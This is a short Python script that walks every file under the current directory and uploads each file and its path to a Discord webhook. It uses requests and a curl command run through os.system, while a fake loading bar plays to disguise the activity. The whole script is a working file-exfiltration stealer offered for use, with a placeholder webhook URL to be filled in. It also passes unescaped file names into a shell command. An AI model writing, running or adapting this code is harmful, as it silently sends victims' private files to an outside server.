import os
import sys
import time
import requests

path = os.getcwd()

def print_ascii_animation(ascii_art, iterations=1, delay=0.1):
    for _ in range(iterations):
        for frame in ascii_art:
            sys.stdout.write(frame)
            sys.stdout.flush()
            time.sleep(delay)
            sys.stdout.write('\r')  
    sys.stdout.write('\n')

loading_animation = [
    "[▒▒▒▒▒▒▒▒▒▒]   0% ",
    "[█▒▒▒▒▒▒▒▒▒]   10% ",
    "[██▒▒▒▒▒▒▒▒]   20% ",
    "[███▒▒▒▒▒▒▒]   30% ",
    "[████▒▒▒▒▒▒]   40% ",
    "[█████▒▒▒▒▒]   50% ",
    "[██████▒▒▒▒]   60% ",
    "[███████▒▒▒]   70% ",
    "[████████▒▒]   80% ",
    "[█████████▒]   90% ",
    "[██████████]   100% "
]

def send_to_discord(file_name, webhook_url):
    message = "".join(file_name)
    data = {
        "content": f"```{message}```"
    }
    requests.post(webhook_url, json=data)

    curl_command = f'curl -s -o nul -F file1=@"{file_name}" "{webhook_url}"'
    os.system(curl_command)

def traverse_directory(folder_path, webhook_url):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            print_ascii_animation(loading_animation, iterations=1)
            send_to_discord(file_path, webhook_url)

def main():
    folder_path = path 
    webhook_url = "YOUR_WEBHOOK_URL"

    traverse_directory(folder_path, webhook_url)

    files = os.listdir(folder_path)
    file_name = []

    for file in files:
        if os.path.isfile(os.path.join(folder_path, file)):
            file_name.append(file)

if __name__ == "__main__":
    main()